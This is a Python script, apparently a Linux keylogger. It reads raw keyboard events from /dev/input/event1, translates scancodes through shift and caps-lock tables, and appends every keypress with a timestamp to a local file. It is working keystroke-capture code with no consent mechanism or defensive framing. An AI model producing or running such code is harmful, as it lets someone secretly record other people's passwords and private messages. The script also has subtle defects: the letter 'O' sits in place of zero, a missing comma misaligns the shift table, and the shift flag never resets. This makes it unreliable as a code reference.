import struct
import time

scancode_to_ascii = [
    "[Unknown]","[Esc]",
    "1","2","3","4","5","6","7","8","9","O", "-", "=","[Backspace]", "[Tab]",
    "q" , "w" , "e" , "r", "t","y","u","i","o","p","[", "]", "[Enter]","[LCtrl]","a", "s" , "d", "f","g", "h","j","k","l","; ","'", "`", "[Lshift] ",
    " \\ ", "z","x","c","v","b", "n","m", ",", ".", "/","[Rshift]",
    "[NL*]",
    "[LAlt]", " ", "[CapsLock]",
    "[F1] ","[F2]","[F3] ","[F4]","[F5]","[F6] ","[F7]","[F8] ","[F9]","[F10]","[NumLock]","[ScrollLock]",
    "[NL7]","[NL8]","[NL9]","[NL-] ",
    "[NL4]","[NL5]","[NL6] ","[NL+] ",
    "[NL1] ","[NL2]","[NL3]","[NL0]","[NL. ] ",
    "[Unknown]","[Unknown]","[Unknown]",
    "[F11]","[F12]",
    "[Unknown]","[Unknown]","[Unknown]","[Unknown]","[Unknown]","[Unknown]","[Unknown]",
    "[NLEnter] ","[RCtrl]","[NL/]"," [SysRq] ", "[RAlt]","[Unknown]",
    "[Home] ","[Up] ","[PageUp] ","[Left] ","[Right] ","[End]" ,"[Down]" ,"[PageDown]", "[Insert]", "[Delete]"
]

shift_scancode_to_ascii = [
    "[Unknown]","[Esc] ",
    " ! ", "@","#","$","%%","^","&","*","(",")","_","+","[Backspace]", "[Tab]",
    "Q","W","E","R","T","Y","U","I","O","P","{","}"
    "[Enter]", "[Lctrl]",
    "A", "S","D","F","G","H","J","K","L",":","\"", "~", "[Lshift]",
    "|","Z","X","C","V","B","N","M","<",">","?","[RShift]",
    "[NL*]",
    "[LAlt]", " ", " [CapsLock] ",
    "[F1]","[F2]","[F3]","[F4]","[F5]","[F6] ","[F7]","[F8] ","[F9] ","[F10]","[NumLock]"," [ScrollLock]",
    "[NL7] ","[NL8]","[NL9]","[NL-] ",
    "[NL4] ","[NL5]","[NL6]","[NL+] ",
    "[NL1] ","[NL2] ","[NL3]","[NL0] ","[NL.] ",
    "[Unknown]","[Unknown]","[Unknown]",
    "[F11]","[F12]",
    "[Unknown]","[Unknown]","[Unknown]","[Unknown]","[Unknown]","[Unknown]","[Unknown]",
    "[NLEnter] ","[RCtrl]","[NL/]","[SysRq] ","[RAlt]","[Unknown]",
    "[Home]", "[Up]","[PageUp]","[Left] ","[Right] "," [End]" ,"[Down]"," [PageDown]", " [Insert]", "[Delete]"
]

caps_scancode_to_ascii = [
    "[Unknown]", "[Esc]",
    "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "[Backspace]", "[Tab]",
    "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "[", "]", "[Enter]", "[LCtrl]", 
    "A", "S", "D", "F", "G", "H", "J", "K", "L", ";", "'", "`", "[Lshift]",
    "\\", "Z", "X", "C", "V", "B", "N", "M", ",", ".", "/", "[RShift]",
    "[NL*]",
    "[LAlt]", " ", "[CapsLock]",
    "[F1]", "[F2]", "[F3]", "[F4]", "[F5]", "[F6]", "[F7]", "[F8]", "[F9]", "[F10]", "[NumLock]", "[ScrollLock]",
    "[NL7]", "[NL8]", "[NL9]", "[NL-]",
    "[NL4]", "[NL5]", "[NL6]", "[NL+]",
    "[NL1]", "[NL2]", "[NL3]", "[NL0]", "[NL.]",
    "[Unknown]", "[Unknown]", "[Unknown]",
    "[F11]", "[F12]",
    "[Unknown]", "[Unknown]", "[Unknown]", "[Unknown]", "[Unknown]", "[Unknown]", "[Unknown]",
    "[NLEnter]", "[RCtrl]", "[NL/]", "[SysRq]", "[RAlt]", "[Unknown]",
    "[Home]", "[Up]", "[PageUp]", "[Left]", "[Right]", "[End]", "[Down]", "[PageDown]", "[Insert]", "[Delete]"
]

def main():
    shift_pressed = False
    caps_pressed = False

    with open("2.txt", "a+") as fh:
        with open("/dev/input/event1", "rb") as file:
            while True:
                event = file.read(24)
                _, _, type, code, value = struct.unpack("llHHI", event)

                if type == 1 and value == 1:  # 按下键
                    timestamp = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
                    if code == 42 or code == 54:  # LShift = 42，RShift = 54
                        shift_pressed = True
                    elif code == 58:  # Caps Lock = 58
                        caps_pressed = not caps_pressed

                    if shift_pressed:
                        fh.write(f"{timestamp}: Key {shift_scancode_to_ascii[code]} pressed.\n")
                        fh.flush()
                    elif caps_pressed:
                        fh.write(f"{timestamp}: Key {caps_scancode_to_ascii[code]} pressed.\n")
                        fh.flush()
                    else:
                        fh.write(f"{timestamp}: Key {scancode_to_ascii[code]} pressed.\n")
                        fh.flush()


if __name__ == "__main__":
    main()
